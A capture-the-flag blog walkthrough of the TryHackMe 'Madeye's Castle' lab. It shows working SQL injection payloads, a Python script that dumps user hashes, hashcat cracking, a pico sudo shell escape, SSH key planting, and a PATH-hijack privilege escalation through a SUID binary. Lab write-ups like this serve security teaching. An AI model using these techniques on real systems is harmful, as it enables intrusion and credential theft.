---
layout: post
title: TryHackMe Walkthrough - Madeye's Castle
date: 2021-07-04
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
- Machine
permalink: /2021/07/MadeyesCastle
img: 2021/07/MadeyesCastle/MadeyesCastle.jpeg
---

This was a very fun room in which I had to do some SQL injection, password cracking, and use two different techniques to escalate privileges. 

* Room: Madeye's Castle
* Difficulty: Medium
* URL: [https://tryhackme.com/room/madeyescastle](https://tryhackme.com/room/madeyescastle)
* Author: [madeye](https://tryhackme.com/p/madeye)

```
A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja

Have fun storming Madeye's Castle! In this room you will need to fully enumerate the system, gain a foothold, and then pivot around to a few different users. 
```

## Enumeration

I started the room by looking for open ports.

```bash
$ rustscan -a target  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.120.95:22
Open 10.10.120.95:80
Open 10.10.120.95:139
Open 10.10.120.95:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 10:17 EDT
Initiating Ping Scan at 10:17
Scanning 10.10.120.95 [2 ports]
Completed Ping Scan at 10:17, 0.23s elapsed (1 total hosts)
Initiating Connect Scan at 10:17
Scanning target (10.10.120.95) [4 ports]
Discovered open port 22/tcp on 10.10.120.95
Discovered open port 139/tcp on 10.10.120.95
Discovered open port 80/tcp on 10.10.120.95
Discovered open port 445/tcp on 10.10.120.95
Completed Connect Scan at 10:17, 0.24s elapsed (4 total ports)
Nmap scan report for target (10.10.120.95)
Host is up, received syn-ack (0.24s latency).
Scanned at 2021-07-04 10:17:44 EDT for 1s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```

There was four ports opened on the machine. 
* 22 - SSH
* 80 - HTTP
* 139 - NETBIOS Session Service
* 445 - NETBIOS

## Web Site
Next, I looked at the web site. It was a slightly modified version of the Apache default page. 

![Apache Default Page](/assets/images/2021/07/MadeyesCastle/01_ApacheDefault.png "Apache Default Page")

In red, it said: "It works! So do comments!". I went and looked at the page source code and found this comment. 

```html
 <!--
        TODO: Virtual hosting is good. 
        TODO: Register for hogwartz-castle.thm
  -->
```

I added 'hogwartz-castle.thm' to my hosts file and navigated to [http://hogwartz-castle.thm/](http://hogwartz-castle.thm/). 

![Welcome to Hogwartz](/assets/images/2021/07/MadeyesCastle/02_WelcomeToHogwartz.png "Welcome to Hogwartz")

There was only a login form on the page. I tried entering only a single quote as the username. It returned an 'Internal Server Error'. It looked like the page was vulnerable to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection). 

## SQL Injection

Next I tried submitting the user name `' or 1 = 1 -- -` and I got this JSON error.

```json
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
```

Then I started experimenting with union to find out how many columns the query returned. I got an error page when I tried from one to three columns. But at four columns, I got a error message saying that the password was incorrect. So the query expects four columns.

Sending this query:
```
' UNION SELECT 1, 2, 3, 4 -- - 
```

Gave my this JSON result:
```
`{"error":"The password for 1 is incorrect! 4"}`
```

With some experimentation, I figured out that there was a table called `users` with at least two columns named `name` and `password`.

```
' UNION SELECT name, 2, 3, password From users Limit 0, 1  -- - 

{"error":"The password for Aaliyah Allen is incorrect! c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab"}
```

I wanted to dump all the users, but playing with limit clauses showed me that there was 40 users in the database. Extracting them one by one would be long and boring so I decided that I needed to write a small script to do it. 

But before writing the script, I launched hashcat to try to crack the passwords I already had. 

```bash
$ haiti 2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b  
SHA-512 [HC: 1700] [JtR: raw-sha512]
SHA3-512 [HC: 17600] [JtR: raw-sha3]
SHA3-512 [HC: 17600] [JtR: dynamic_400]
Keccak-512 [HC: 18000] [JtR: raw-keccak]
BLAKE2-512 [JtR: raw-blake2]
Whirlpool [HC: 6100] [JtR: whirlpool]
Salsa10
Salsa20
Skein-512 [JtR: skein-512]
Skein-1024(512)

$ hashcat -a 0 -m 1700 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz, 1423/1487 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

...

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
```

It failed to crack any of the extracted passwords.

Before I wrote my script, I wanted to get a little more information about the database. 

First I figured out which database engine was running. 

```
' UNION SELECT 1, 2, 3, sqlite_version() from users  -- -

{"error":"The password for 1 is incorrect! 3.22.0"}
```

The server was running SQLite. 

Next, I extracted the table information. 

```
' UNION SELECT tbl_name, 2, 3, sql from sqlite_master Limit 0, 1  -- -

{"error":"The password for users is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)"}
```

There was only one table in the database. I already guessed it's name. The query gave me all four columns it contained. 

I was then ready to write the script to extract all the users. 

```python
import requests

def sendRequest(query):
    data = {'user': query, 'password': ''}
    response = requests.post('http://hogwartz-castle.thm/login', data=data)
    print(response.text)



originalQuery = "' UNION Select 1, 2, 3, name || ' - ' || password || ' - ' || admin || ' - ' || notes  from users Limit POSITION, 1 -- -"
for i in range(40):
    query = originalQuery.replace('POSITION', str(i))
    sendRequest(query)
```

I ran the script to extract all 40 users. They all the same note saying to keep digging except one. 

```
{"error":"The password for 1 is incorrect! Aaliyah Allen - c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab - 0 -  contact administrator. Congrats on SQL injection... keep digging"}

{"error":"The password for 1 is incorrect! Aaliyah Sanders - dc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0 - 0 -  contact administrator. Congrats on SQL injection... keep digging"}

...

{"error":"The password for 1 is incorrect! Harry Turner - b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885 - 0 - My linux username is my first name, and password uses best64"}

....


{"error":"The password for 1 is incorrect! Zoey Gonzales - 134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdb - 0 -  contact administrator. Congrats on SQL injection... keep digging"}
```

The note for the user Harry Turner said "My linux username is my first name, and password uses best64".

At first I tough that best64 was a password list, but I couldn't find it. I had other list called bestX, but none of them helped my crack the password.

```bash
$ python wordlistctl.py search best
--==[ wordlistctl by blackarch.org ]==--

    0 > best1050 (9.03 Kb)
    1 > best110 (959.00 B)
    2 > best15 (124.00 B)
    3 > dirb_best1050 (8.82 Kb)
    4 > assetnote_best-dns-wordlist (145.72 Mb)
```

I tried using the fasttrack and rockyou lists. That also failed. 

Then I searched on the web for a best64 password list. That's when I found out that it was [a rule set to use with hashcat](https://www.question-defense.com/2012/04/21/hashcat-best64-rule-details-updated-after-the-best64-challenge). 

I tried rockyou again, but this time using the rules and it found the password. 

```
$ hashcat -a 0 -m 1700 hash2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
...
Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:REDACTED
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-512
Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
Time.Started.....: Sun Jul  4 11:57:13 2021 (26 secs)
Time.Estimated...: Sun Jul  4 11:57:39 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1666.5 kH/s (10.36ms) @ Accel:128 Loops:77 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 43642368/1104517645 (3.95%)
Rejected.........: 0/43642368 (0.00%)
Restore.Point....: 566528/14344385 (3.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidates.#1....: winner25 -> w7w7w7

Started: Sun Jul  4 11:57:11 2021
Stopped: Sun Jul  4 11:57:41 2021

```

I used the found password to connect to the server ssh. I got in and found the first flag. 

```bash
$ ssh harry@target 
harry@target's password: 
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Nov 26 01:42:18 2020

harry@hogwartz-castle:~$ ls
user1.txt

harry@hogwartz-castle:~$ cat user1.txt 
REDACTED
```

## Lateral Escalation

I was in the server, now I needed to escalate my privileges. 

```bash
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```

My user was allowed to run pico as hermonine. 

I looked at [GTFOBins](https://gtfobins.github.io/gtfobins/pico/#sudo) to find if I could use pico to launch a shell as the user. 

All I needed to do was launch pico, then use CTRL-r CTRL-x and launch sh. 

```
sudo pico
^R^X
reset; sh 1>&0 2>&0
```

I did it, using sudo to run it as hermonine. 

```bash
harry@hogwartz-castle:~$ sudo -u hermonine pico
Unable to create directory /home/harry/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue


^R^X
reset; sh 1>&0 2>&0
```

This gave me a shell and the second flag. 

```bash
$ whoami
hermonine
$ cd /home/hermonine

$ ls
user2.txt

$ cat user2.txt
REDACTED
```

That shell was not working very well. So I used it to copy my public SSH key in hermonine's home folder and reconnect with SSH.

```bash
$ echo PUBLIC_KEY > .ssh/authorized_keys
$ chmod 600 .ssh/authorized_keys
$ chmod 700 .ssh
```

## Getting root

Next I looked for ways to get root. I could not run sudo with hermonine since it required a password and I did not know it. 

I looked for files with the suid bit set. 

```bash
hermonine@hogwartz-castle:~$ find / -perm /u=s 2>/dev/null 
/srv/time-turner/swagger
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
...
```

The first file it found looked interesting. 

```bash
hermonine@hogwartz-castle:~$ file /srv/time-turner/swagger
/srv/time-turner/swagger: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=36c89f8b196c651950f369719ff6e50f1b427ff8, not stripped

hermonine@hogwartz-castle:~$ /srv/time-turner/swagger 
Guess my number: 1
Nope, that is not what I was thinking
I was thinking of 1225937666

hermonine@hogwartz-castle:~$ /srv/time-turner/swagger 
Guess my number: 1
Nope, that is not what I was thinking
I was thinking of 2038734502
```

I downloaded the file to my machine and opened it in Ghidra. 

![Decompiled Main](/assets/images/2021/07/MadeyesCastle/03_DecompiledMain.png "Decompiled Main")

The program generate a random number using the time as the seed. I could use the same code to generate the number, print it, and feed it to the swagger executable.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>


int main(void)
{
  time_t tVar1;
  long in_FS_OFFSET;
  ulong local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  printf("%d",(ulong)local_14);

  return 0;
}
```

I compiled the code and used it to pass the number check.

```bash
hermonine@hogwartz-castle:~$ gcc getnumber.c -o getnumber

hermonine@hogwartz-castle:~$ ./getnumber | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is x86_64

hermonine@hogwartz-castle:~$ ./getnumber | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is x86_64
```

I could predict the number it generate, but that did not help me much. I then looked at the code for the function `impressive()` that gets called when I entered the correct number. 

![Decompiled Impressive](/assets/images/2021/07/MadeyesCastle/04_DecompiledImpressive.png "Decompiled Impressive")

This function set the group and user id to 0, to make sure that what comes after runs as root. Then it print some stuff, and calls `umame` to get the system architecture. 

It did not use the full path to call `uname`. So I could write a file named `uname`, make it executable, and make sure it was in my path before the real command. This way, when the program would call uname, my script would be executed. 

```bash
hermonine@hogwartz-castle:~$ cat uname 
#!/bin/bash
cat /root/root.txt

hermonine@hogwartz-castle:~$ chmod +x uname

hermonine@hogwartz-castle:~$ PATH=/home/hermonine:$PATH

hermonine@hogwartz-castle:~$ echo $PATH
/home/hermonine:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

hermonine@hogwartz-castle:~$ ./getnumber | /srv/time-turner/swagger
Guess my number: Nice use of the time-turner!
This system architecture is REDACTED
```




